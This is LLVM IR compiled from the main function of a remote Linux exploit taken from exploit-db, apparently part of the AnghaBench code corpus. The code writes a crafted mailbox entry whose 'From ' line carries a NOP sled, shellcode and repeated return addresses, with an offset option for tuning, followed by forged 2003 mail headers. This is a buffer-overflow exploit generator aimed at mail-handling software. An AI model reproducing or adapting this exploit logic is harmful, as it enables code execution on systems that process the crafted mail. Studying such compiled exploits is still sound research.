; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_22873.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_22873.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@LEN = common dso_local global i32 0, align 4
@RET = common dso_local global i64 0, align 8
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [41 x i8] c"usage: %s <-m outfile> [-o offset] [-h]\0A\00", align 1
@.str.1 = private unnamed_addr constant [6 x i8] c"m:o:h\00", align 1
@optarg = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [7 x i8] c"malloc\00", align 1
@.str.3 = private unnamed_addr constant [15 x i8] c"[+] ret 0x%lx\0A\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"From \00", align 1
@code = common dso_local global i8* null, align 8
@NOP = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [36 x i8] c"@foo.bar  Thu Jun 26 16:45:16 2003\0A\00", align 1
@.str.6 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.7 = private unnamed_addr constant [6 x i8] c"fopen\00", align 1
@.str.8 = private unnamed_addr constant [12 x i8] c"[+] out %s\0A\00", align 1
@stdout = common dso_local global i32* null, align 8
@.str.9 = private unnamed_addr constant [16 x i8] c"[+] out stdout\0A\00", align 1
@.str.10 = private unnamed_addr constant [29 x i8] c"Return-Path: <root@foo.bar>\0A\00", align 1
@.str.11 = private unnamed_addr constant [49 x i8] c"Received: from localhost (localhost [127.0.0.1])\00", align 1
@.str.12 = private unnamed_addr constant [60 x i8] c"\09by localhost (8.12.4/8.12.4) with ESMTP id h5QNPG2q003945\0A\00", align 1
@.str.13 = private unnamed_addr constant [54 x i8] c"\09for <root@foo.bar>; Thu, 26 Jun 2003 16:45:16 -0700\0A\00", align 1
@.str.14 = private unnamed_addr constant [31 x i8] c"Received: (from root@foo.bar)\0A\00", align 1
@.str.15 = private unnamed_addr constant [56 x i8] c"\09by localhost (8.12.4/8.12.4/Submit) id h5QNPGuc004172\0A\00", align 1
@.str.16 = private unnamed_addr constant [44 x i8] c"\09for root; Thu, 26 Jun 2003 16:45:16 -0700\0A\00", align 1
@.str.17 = private unnamed_addr constant [39 x i8] c"Date: Thu, 26 Jun 2003 16:45:12 -0700\0A\00", align 1
@.str.18 = private unnamed_addr constant [20 x i8] c"From: root@foo.bar\0A\00", align 1
@.str.19 = private unnamed_addr constant [53 x i8] c"Message-Id: <200306262325.h5QNPGuc003744@localhost>\0A\00", align 1
@.str.20 = private unnamed_addr constant [18 x i8] c"To: root@foo.bar\0A\00", align 1
@.str.21 = private unnamed_addr constant [18 x i8] c"Subject: foobar\0A\0A\00", align 1
@.str.22 = private unnamed_addr constant [9 x i8] c"foobar\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i64, align 8
  %13 = alloca i64, align 8
  %14 = alloca i64*, align 8
  %15 = alloca i32*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i8* null, i8** %9, align 8
  store i8* null, i8** %10, align 8
  %16 = load i32, i32* @LEN, align 4
  %17 = add nsw i32 5, %16
  %18 = add nsw i32 %17, 6
  %19 = add nsw i32 %18, 2
  %20 = add nsw i32 %19, 3
  %21 = add nsw i32 %20, 1
  %22 = add nsw i32 %21, 3
  %23 = add nsw i32 %22, 2
  %24 = add nsw i32 %23, 1
  %25 = add nsw i32 %24, 8
  %26 = add nsw i32 %25, 1
  %27 = add nsw i32 %26, 4
  %28 = add nsw i32 %27, 2
  %29 = zext i32 %28 to i64
  %30 = call i8* @llvm.stacksave()
  store i8* %30, i8** %11, align 8
  %31 = alloca i8, i64 %29, align 16
  store i64 %29, i64* %12, align 8
  %32 = load i64, i64* @RET, align 8
  store i64 %32, i64* %13, align 8
  store i64* null, i64** %14, align 8
  %33 = load i32, i32* %4, align 4
  %34 = icmp slt i32 %33, 2
  br i1 %34, label %35, label %42

35:                                               ; preds = %2
  %36 = load i32, i32* @stderr, align 4
  %37 = load i8**, i8*** %5, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 0
  %39 = load i8*, i8** %38, align 8
  %40 = call i32 (i32, i8*, ...) @fprintf(i32 %36, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str, i64 0, i64 0), i8* %39)
  %41 = call i32 @exit(i32 1) #4
  unreachable

42:                                               ; preds = %2
  br label %43

43:                                               ; preds = %77, %42
  %44 = load i32, i32* %4, align 4
  %45 = load i8**, i8*** %5, align 8
  %46 = call signext i8 @getopt(i32 %44, i8** %45, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i64 0, i64 0))
  store i8 %46, i8* %8, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp ne i32 %47, -1
  br i1 %48, label %49, label %78

49:                                               ; preds = %43
  %50 = load i8, i8* %8, align 1
  %51 = sext i8 %50 to i32
  switch i32 %51, label %77 [
    i32 104, label %52
    i32 111, label %59
    i32 109, label %64
  ]

52:                                               ; preds = %49
  %53 = load i32, i32* @stderr, align 4
  %54 = load i8**, i8*** %5, align 8
  %55 = getelementptr inbounds i8*, i8** %54, i64 0
  %56 = load i8*, i8** %55, align 8
  %57 = call i32 (i32, i8*, ...) @fprintf(i32 %53, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str, i64 0, i64 0), i8* %56)
  %58 = call i32 @exit(i32 1) #4
  unreachable

59:                                               ; preds = %49
  %60 = load i8*, i8** @optarg, align 8
  %61 = call i64 @atoi(i8* %60)
  %62 = load i64, i64* %13, align 8
  %63 = sub nsw i64 %62, %61
  store i64 %63, i64* %13, align 8
  br label %77

64:                                               ; preds = %49
  %65 = load i8*, i8** @optarg, align 8
  %66 = call i32 @strlen(i8* %65)
  %67 = add nsw i32 %66, 1
  %68 = call i8* @malloc(i32 %67)
  store i8* %68, i8** %9, align 8
  %69 = icmp ne i8* %68, null
  br i1 %69, label %73, label %70

70:                                               ; preds = %64
  %71 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i64 0, i64 0))
  %72 = call i32 @exit(i32 1) #4
  unreachable

73:                                               ; preds = %64
  %74 = load i8*, i8** %9, align 8
  %75 = load i8*, i8** @optarg, align 8
  %76 = call i32 @strcpy(i8* %74, i8* %75)
  br label %77

77:                                               ; preds = %49, %73, %59
  br label %43

78:                                               ; preds = %43
  %79 = load i8*, i8** %9, align 8
  %80 = icmp ne i8* %79, null
  br i1 %80, label %88, label %81

81:                                               ; preds = %78
  %82 = load i32, i32* @stderr, align 4
  %83 = load i8**, i8*** %5, align 8
  %84 = getelementptr inbounds i8*, i8** %83, i64 0
  %85 = load i8*, i8** %84, align 8
  %86 = call i32 (i32, i8*, ...) @fprintf(i32 %82, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str, i64 0, i64 0), i8* %85)
  %87 = call i32 @exit(i32 1) #4
  unreachable

88:                                               ; preds = %78
  %89 = load i32, i32* @stderr, align 4
  %90 = load i64, i64* %13, align 8
  %91 = call i32 (i32, i8*, ...) @fprintf(i32 %89, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.3, i64 0, i64 0), i64 %90)
  %92 = call i32 @strcpy(i8* %31, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i64 0, i64 0))
  %93 = getelementptr inbounds i8, i8* %31, i64 5
  store i8* %93, i8** %10, align 8
  store i32 0, i32* %6, align 4
  br label %94

94:                                               ; preds = %107, %88
  %95 = load i32, i32* %6, align 4
  %96 = load i32, i32* @LEN, align 4
  %97 = load i8*, i8** @code, align 8
  %98 = call i32 @strlen(i8* %97)
  %99 = sub nsw i32 %96, %98
  %100 = sub nsw i32 %99, 4
  %101 = icmp slt i32 %95, %100
  br i1 %101, label %102, label %110

102:                                              ; preds = %94
  %103 = load i32, i32* @NOP, align 4
  %104 = trunc i32 %103 to i8
  %105 = load i8*, i8** %10, align 8
  %106 = getelementptr inbounds i8, i8* %105, i32 1
  store i8* %106, i8** %10, align 8
  store i8 %104, i8* %105, align 1
  br label %107

107:                                              ; preds = %102
  %108 = load i32, i32* %6, align 4
  %109 = add nsw i32 %108, 1
  store i32 %109, i32* %6, align 4
  br label %94

110:                                              ; preds = %94
  store i32 0, i32* %6, align 4
  br label %111

111:                                              ; preds = %124, %110
  %112 = load i32, i32* %6, align 4
  %113 = load i8*, i8** @code, align 8
  %114 = call i32 @strlen(i8* %113)
  %115 = icmp slt i32 %112, %114
  br i1 %115, label %116, label %127

116:                                              ; preds = %111
  %117 = load i8*, i8** @code, align 8
  %118 = load i32, i32* %6, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds i8, i8* %117, i64 %119
  %121 = load i8, i8* %120, align 1
  %122 = load i8*, i8** %10, align 8
  %123 = getelementptr inbounds i8, i8* %122, i32 1
  store i8* %123, i8** %10, align 8
  store i8 %121, i8* %122, align 1
  br label %124

124:                                              ; preds = %116
  %125 = load i32, i32* %6, align 4
  %126 = add nsw i32 %125, 1
  store i32 %126, i32* %6, align 4
  br label %111

127:                                              ; preds = %111
  %128 = load i8*, i8** %10, align 8
  %129 = bitcast i8* %128 to i64*
  store i64* %129, i64** %14, align 8
  store i32 0, i32* %6, align 4
  br label %130

130:                                              ; preds = %137, %127
  %131 = load i32, i32* %6, align 4
  %132 = icmp slt i32 %131, 4
  br i1 %132, label %133, label %140

133:                                              ; preds = %130
  %134 = load i64, i64* %13, align 8
  %135 = load i64*, i64** %14, align 8
  %136 = getelementptr inbounds i64, i64* %135, i32 1
  store i64* %136, i64** %14, align 8
  store i64 %134, i64* %135, align 8
  br label %137

137:                                              ; preds = %133
  %138 = load i32, i32* %6, align 4
  %139 = add nsw i32 %138, 4
  store i32 %139, i32* %6, align 4
  br label %130

140:                                              ; preds = %130
  %141 = load i8*, i8** %10, align 8
  %142 = getelementptr inbounds i8, i8* %141, i64 4
  store i8 0, i8* %142, align 1
  %143 = call i32 @strcat(i8* %31, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.5, i64 0, i64 0))
  %144 = load i8*, i8** %9, align 8
  %145 = icmp ne i8* %144, null
  br i1 %145, label %146, label %157

146:                                              ; preds = %140
  %147 = load i8*, i8** %9, align 8
  %148 = call i32* @fopen(i8* %147, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.6, i64 0, i64 0))
  store i32* %148, i32** %15, align 8
  %149 = icmp ne i32* %148, null
  br i1 %149, label %153, label %150

150:                                              ; preds = %146
  %151 = call i32 @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i64 0, i64 0))
  %152 = call i32 @exit(i32 1) #4
  unreachable

153:                                              ; preds = %146
  %154 = load i32, i32* @stderr, align 4
  %155 = load i8*, i8** %9, align 8
  %156 = call i32 (i32, i8*, ...) @fprintf(i32 %154, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.8, i64 0, i64 0), i8* %155)
  br label %161

157:                                              ; preds = %140
  %158 = load i32*, i32** @stdout, align 8
  store i32* %158, i32** %15, align 8
  %159 = load i32, i32* @stderr, align 4
  %160 = call i32 (i32, i8*, ...) @fprintf(i32 %159, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.9, i64 0, i64 0))
  br label %161

161:                                              ; preds = %157, %153
  %162 = load i32*, i32** %15, align 8
  %163 = call i32 @fputs(i8* %31, i32* %162)
  %164 = load i32*, i32** %15, align 8
  %165 = call i32 @fputs(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.10, i64 0, i64 0), i32* %164)
  %166 = load i32*, i32** %15, align 8
  %167 = call i32 @fputs(i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.11, i64 0, i64 0), i32* %166)
  %168 = load i32*, i32** %15, align 8
  %169 = call i32 @fputs(i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.12, i64 0, i64 0), i32* %168)
  %170 = load i32*, i32** %15, align 8
  %171 = call i32 @fputs(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.13, i64 0, i64 0), i32* %170)
  %172 = load i32*, i32** %15, align 8
  %173 = call i32 @fputs(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.14, i64 0, i64 0), i32* %172)
  %174 = load i32*, i32** %15, align 8
  %175 = call i32 @fputs(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.15, i64 0, i64 0), i32* %174)
  %176 = load i32*, i32** %15, align 8
  %177 = call i32 @fputs(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.16, i64 0, i64 0), i32* %176)
  %178 = load i32*, i32** %15, align 8
  %179 = call i32 @fputs(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.17, i64 0, i64 0), i32* %178)
  %180 = load i32*, i32** %15, align 8
  %181 = call i32 @fputs(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.18, i64 0, i64 0), i32* %180)
  %182 = load i32*, i32** %15, align 8
  %183 = call i32 @fputs(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.19, i64 0, i64 0), i32* %182)
  %184 = load i32*, i32** %15, align 8
  %185 = call i32 @fputs(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.20, i64 0, i64 0), i32* %184)
  %186 = load i32*, i32** %15, align 8
  %187 = call i32 @fputs(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.21, i64 0, i64 0), i32* %186)
  %188 = load i32*, i32** %15, align 8
  %189 = call i32 @fputs(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.22, i64 0, i64 0), i32* %188)
  %190 = load i32*, i32** %15, align 8
  %191 = call i32 @fclose(i32* %190)
  %192 = load i8*, i8** %9, align 8
  %193 = call i32 @free(i8* %192)
  %194 = call i32 @exit(i32 0) #4
  unreachable
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @fprintf(i32, i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local signext i8 @getopt(i32, i8**, i8*) #2

declare dso_local i64 @atoi(i8*) #2

declare dso_local i8* @malloc(i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i32 @strcpy(i8*, i8*) #2

declare dso_local i32 @strcat(i8*, i8*) #2

declare dso_local i32* @fopen(i8*, i8*) #2

declare dso_local i32 @fputs(i8*, i32*) #2

declare dso_local i32 @fclose(i32*) #2

declare dso_local i32 @free(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
